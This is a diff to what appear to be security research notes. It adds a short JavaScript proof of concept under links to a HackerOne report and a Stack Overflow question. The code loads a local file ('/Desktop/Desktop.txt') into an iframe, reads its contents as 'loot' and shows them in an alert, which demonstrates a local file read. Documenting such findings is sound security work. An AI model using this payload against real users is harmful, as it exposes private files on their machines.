@@ -2,3 +2,9 @@ https://stackoverflow.com/questions/20035101/why-doesn-t-postman-get-a-no-access
 
 
 https://hackerone.com/reports/175979
+
+current_href = document.location.href
+frame = document.createElement('iframe'); frame.src = current_href.replace('/Downloads/test.html', '/Desktop/Desktop.txt'); frame.id = 'frm'; document.getElementById('match_info_2').appendChild(frame)
+setTimeout(function func(){loot = document.getElementById('frm').contentWindow.document.getElementsByTagName('pre')[0].innerHTML
+alert('Your data is: ' + loot)
+}, 500)
